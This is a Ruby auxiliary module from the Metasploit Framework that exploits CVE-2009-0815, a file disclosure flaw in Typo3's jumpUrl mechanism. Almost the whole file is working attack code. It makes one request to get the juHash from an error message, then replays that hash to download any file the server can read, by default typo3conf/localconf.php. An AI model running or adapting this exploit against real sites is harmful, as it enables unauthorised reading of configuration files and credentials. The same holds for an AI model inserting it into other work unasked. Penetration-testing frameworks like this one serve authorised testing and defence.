##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Typo3 sa-2009-002 File Disclosure',
      'Description'    => %q{
        This module exploits a file disclosure vulnerability in the jumpUrl mechanism of
      Typo3. This flaw can be used to read any file that the web server user account has
      access to.

      },
      'Author'         => [ 'spinbad <spinbad.security[at]googlemail.com>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['OSVDB', '52048'],
          ['CVE', '2009-0815'],
          ['URL', 'http://secunia.com/advisories/33829/'],
          ['EDB', '8038'],
          ['URL', 'http://typo3.org/teams/security/security-bulletins/typo3-sa-2009-002/'],
        ],
      'DisclosureDate' => 'Feb 10 2009',
      'Actions'        =>
        [
          ['Download']
        ],
      'DefaultAction'  => 'Download'
      ))

    register_options(
      [
        OptString.new('URI', [true, "Typo3 Path", "/"]),
        OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
        OptString.new('LFILE',[true, "The local filename to store the data", "localconf.php"]),
      ], self.class)
  end

  def run
    print_status("Establishing a connection to the target...")

    error_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&locationData=1:"
    ju_hash = nil

    res = send_request_raw({
      'uri'     => error_uri,
      'method'  => 'GET',
      'headers' =>
      {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close',
      }
    }, 25)

    if (res and res.message == "OK")
      res.body =~ /jumpurl Secure: Calculated juHash, ((\w)+), did not match the submitted juHash./

      if $1.nil?
        print_error("Error while getting juHash. Maybe the version is already patched...")
        return
      end

      ju_hash = $1
      print_status("Getting juHash from error message: #{ju_hash}")

    else
      print_error("No response from the server.")
      return
    end


    file_uri = datastore['URI'] + "/index.php?jumpurl=" +datastore['RFILE'] +"&juSecure=1&type=0&juHash=#{ju_hash}&locationData=1:"
    print_status("Trying to get #{datastore['RFILE']}.")

    file = send_request_raw({
      'uri'     => file_uri,
      'method'  => 'GET',
      'headers' =>
      {
        'User-Agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
        'Connection' => 'Close',
      }
    },25)

    if (file and file.message = "OK")
      if file.body == 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
        print_error("File #{datastore['RFILE']} does not exist.")
        return
      end

      print_status("Writing local file #{datastore['LFILE']}.")
      open(datastore['LFILE'],'w') {|f| f << file.body }
    else
      print_error("Error while getting file.")
    end

  end
end
